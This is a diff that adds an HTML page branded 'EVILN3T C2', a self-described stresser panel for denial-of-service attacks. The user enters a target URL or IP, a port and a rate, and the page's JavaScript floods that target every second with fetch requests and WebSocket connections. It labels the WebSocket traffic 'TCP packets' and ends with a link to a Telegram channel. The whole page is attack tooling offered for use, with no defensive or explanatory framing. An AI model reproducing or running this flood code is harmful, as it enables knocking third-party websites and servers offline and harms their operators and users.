@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>EVILN3T C2</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            background-color: #1a1a1a;
+            color: white;
+            text-align: center;
+            padding-top: 50px;
+            height: 100vh;
+        }
+
+        h1 {
+            color: #ff6600;
+        }
+
+        .container {
+            margin: 20px auto;
+            width: 80%;
+            max-width: 1000px;
+        }
+
+        .input-container input, .input-container select {
+            padding: 10px;
+            width: 300px;
+            font-size: 16px;
+            border: 2px solid #00cc99;
+            border-radius: 5px;
+            background-color: #333;
+            color: white;
+            margin-bottom: 20px;
+        }
+
+        .button {
+            background-color: #ff6600;
+            color: white;
+            padding: 15px 25px;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
+        .button:hover {
+            background-color: #e65c00;
+        }
+
+        .status {
+            margin-top: 20px;
+            font-size: 18px;
+            color: cyan;
+        }
+
+        .logs {
+            max-height: 400px;
+            overflow-y: auto;
+            background-color: #333;
+            padding: 10px;
+            color: white;
+            font-size: 14px;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <h1>EVILN3T C2</h1>
+    <p>Welcome To Stresser Pannel , enjoy </p>
+
+    <div class="container">
+        <!-- Attack Options -->
+        <div class="input-container">
+            <select id="attackType">
+                <option value="HTTPS">Attack URL (HTTPS)</option>
+                <option value="TCP">Attack IP (TCP)</option>
+            </select>
+        </div>
+
+        <div class="input-container">
+            <input type="text" id="targetInput" placeholder="Enter URL/IP to attack">
+        </div>
+
+        <div class="input-container">
+            <input type="number" id="portInput" placeholder="Enter Port Number" value="80">
+        </div>
+
+        <div class="input-container">
+            <input type="number" id="requestRateInput" placeholder="Enter Request Rate per Second" value="1000">
+        </div>
+
+        <!-- Start Button -->
+        <button class="button" onclick="startAttack()">Start Attack</button>
+
+        <!-- Status -->
+        <div class="status" id="status"></div>
+
+        <!-- Logs Section -->
+        <div class="logs" id="logs"></div>
+    </div>
+
+    <script>
+        // Start the attack based on selected option
+        function startAttack() {
+            const attackType = document.getElementById('attackType').value;
+            const target = document.getElementById('targetInput').value;
+            const port = document.getElementById('portInput').value;
+            const requestRate = document.getElementById('requestRateInput').value;
+
+            if (!target || !port || !requestRate) {
+                alert('Please fill out all fields.');
+                return;
+            }
+
+            let statusText = '';
+            if (attackType === 'HTTPS') {
+                statusText = `Starting HTTPS attack on URL: ${target}:${port} with ${requestRate} requests per second...`;
+                document.getElementById('status').textContent = statusText;
+                simulateHttpsAttack(target, port, requestRate);
+            } else if (attackType === 'TCP') {
+                statusText = `Starting TCP attack on IP: ${target}:${port} with ${requestRate} packets per second...`;
+                document.getElementById('status').textContent = statusText;
+                simulateTcpAttack(target, port, requestRate);
+            }
+        }
+
+        // Simulate HTTPS attack (send HTTP requests)
+        function simulateHttpsAttack(url, port, rate) {
+            let count = 0;
+            let interval = setInterval(() => {
+                for (let i = 0; i < rate; i++) {
+                    fetch(`https://${url}:${port}`, { method: 'GATEWAY' })
+                        .then(response => {
+                            console.log('HTTPS request sent to:', url);
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                        });
+                }
+                count += rate;
+                console.log(`Sent ${count} HTTPS requests so far.`);
+            }, 1000); // Sends requests every second
+        }
+
+        // Simulate TCP attack (send TCP packets)
+        function simulateTcpAttack(ip, port, rate) {
+            let count = 0;
+            let interval = setInterval(() => {
+                for (let i = 0; i < rate; i++) {
+                    let socket = new WebSocket(`ws://${ip}:${port}`);
+                    socket.onopen = () => {
+                        socket.send("GET / HTTP/1.1\r\nHost: " + ip + "\r\n\r\n");
+                        console.log(`Sent TCP packet to ${ip}:${port}`);
+                    };
+                    socket.onerror = (error) => {
+                        console.error(`Error sending TCP packet to ${ip}:${port}`);
+                    };
+                }
+                count += rate;
+                console.log(`Sent ${count} TCP packets so far.`);
+            }, 1000); // Sends packets every second
+        }
+    </script>
+    <center><img src="https://j.top4top.io/p_3268bu5gk1.png" width="550" height="350"><a href="https://t.me/evilnet0">Visit Us</a> </center>
+</body>
+</html>
